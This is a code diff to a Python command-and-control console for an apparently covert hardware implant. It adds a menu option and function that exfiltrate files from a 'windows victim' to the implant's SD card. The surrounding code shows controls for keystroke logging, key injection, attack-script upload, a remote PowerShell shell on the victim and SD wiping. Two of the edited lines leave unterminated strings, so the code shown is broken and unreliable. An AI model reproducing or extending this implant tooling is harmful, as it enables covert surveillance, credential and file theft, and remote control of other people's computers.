@@ -27,14 +27,15 @@ allowSleepPW = "DEFAULTallowSleepPW"          #password for disabling insomnia m
 goDarkPW = "DEFAULTgoDarkPW"                  #password for wiping SD card - go dark mode                            - main menu option 11
 injectPW = "DEFAULTinjectPW"                  #password to enable key injection, run script from SD                  - main menu option 14
 rxScriptPW = "DEFAULTrxScriptPW"              #password to transfer an attack script from C2 to SD                   - main menu option 15
-resetPW = "DEFAULTresetPW"                    #password to reset all variables back to default                       - main menu option 18
-deletePW = "DEFAULTdeletePW"                  #password to delete a file on the SD card of a target implant          - main menu option 17
+resetPW = "DEFAULTresetPW"                    #password to reset all variables back to default                       - main menu option 19
+deletePW = "DEFAULTdeletePW"                  #password to delete a file on the SD card of a target implant          - main menu option 18
 sendKeysPW = "DEFAULTsendKeysPW"              #password for downloading keystroke recording file from SD to C2       - main menu option 10
 printFilesPW = "DEFAULTprintFilesPW"          #password to print a list of the files on the SD card                  - main menu option 12
-terminalPW = "DEFAULTterminalPW"              #password for starting a remote powershell terminal on windows victim  - main menu option 16
-terminalPWOFF = "DEFAULTterminalPWOFF"        #password for ending a remote powershell terminal on windows victim    - main menu option 16
+terminalPW = "DEFAULTterminalPW"              #password for starting a remote powershell terminal on windows victim  - main menu option 17
+terminalPWOFF = "DEFAULTterminalPWOFF"        #password for ending a remote powershell terminal on windows victim    - main menu option 17
 exfilPW = "DEFAULTexfilPW"                    #password for copying files from a windows victim to the C2            - main menu option 13
 exfilPWOFF = "DEFAULTexfilPWOFF"              #password for ending copying files from a windows victim to the C2     - main menu option 13
+exfilPWSD = "DEFAULTexfilPWSD"                #Password for copying files from implant to SD                         - main menu option 14 
 
 def listToString(l):
     s = ""
@@ -305,12 +306,13 @@ def main_menu():
     print("11) Self-destruct mode")
     print("12) Get file list from target SD card")
     print("13) Receive files from a windows victim filesystem (uses powershell)")
-    print("14) Launch attack from script")
-    print("15) Send attack script")
-    print("16) Connect to Interactive Powershell Terminal")
-    print("17) Delete a file on target implant SD card")
-    print("18) Reset target implant")
-    print("19) Exit\n")
+    print("14) Receive files from a windows victim filesystem and save to SD card directly (uses powershell)")
+    print("15) Launch attack from script")
+    print("16) Send attack script")
+    print("17) Connect to Interactive Powershell Terminal")
+    print("18) Delete a file on target implant SD card")
+    print("19) Reset target implant")
+    print("20) Exit\n")
 
 
 def submenu_sniff(d, t, m_enable, m_disable):
@@ -403,6 +405,22 @@ def submenu_rx_file(d,p):
             print("User either stopped the process or there was an error.")
             print(e)
             break
+
+# Sends exfil data file straight to SD rather than radio
+def submenu_rx_file_sd(d,p):
+    print("Choose which device to exfil from.")
+    t = target_menu()
+    #Will set exfil to true for SD
+    target_tx(d,t,p)
+    #Send name of full path to get
+    nameRemote = input("Enter file name with extension to get (FULL PATH): ")
+
+    try:
+        print("Sending command to save file to SD.")
+        target_tx(d,t, nameRemote)
+    except Exception:
+            print("There was an error with the submitted address")
+            print("Please try again")            
 
 #
 # submenu_send_file is used to transfer a file from the C2 to the SD
@@ -697,22 +715,26 @@ def loop():
             # uses a powershell script that executes on the victim
             submenu_rx_file(device, exfilPW)
         elif option == '14':
+            # password for data exfil to transfer a file from a windows victim to the C2
+            # uses a powershell script that executes on the victim
+            submenu_rx_file_sd(device, exfilPWSD)    
+        elif option == '15':
             # password for Enabling key injection
             submenu_fileSelect(device, injectPW, "no")
-        elif option == '15':
+        elif option == '16':
             # password for transferring an attack script from C2 to SD
             submenu_send_file(device, rxScriptPW)
-        elif option == '16':
+        elif option == '17':
             # initiate a shell on a windows victim
             print("turning on terminal!")
             terminal(device, terminalPW)
-        elif option == '17':
+        elif option == '18':
             # password for deleting a file from SD card on a target implant
             submenu_fileSelect(device, deletePW, "delete")
-        elif option == '18':
+        elif option == '19:
             # password for resetting all toggle variables in a target implant
             submenu_toggle(device, "Reset all devices", "Reset target device", resetPW)
-        elif option == '19':
+        elif option == '20
             device.close()
             exit()
         else:
